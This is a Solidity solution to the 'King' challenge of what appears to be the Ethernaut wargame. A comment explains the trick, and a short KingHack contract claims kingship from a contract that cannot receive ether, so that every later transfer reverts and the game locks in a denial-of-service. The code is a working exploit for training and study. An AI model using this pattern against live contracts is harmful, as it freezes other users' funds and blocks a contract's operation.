//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
    Solution:
    In order for the receive() method in King.sol to pass,
    it should be able to transfer msg.value to the current king.

    However, if the king address is a contract -instead of an EOA- which has not specified a receive() method or a payable fallback,
    then the transfer will revert and the king shall remain unchanged.
*/

contract KingHack {

    address king;

    error Call_Reverted();

    constructor(address _king) {
        king = _king;
    }

    function convertIntoKing() external payable {
        (bool sent,) = king.call{value: msg.value}("");
        if (!sent) revert Call_Reverted();
    }
}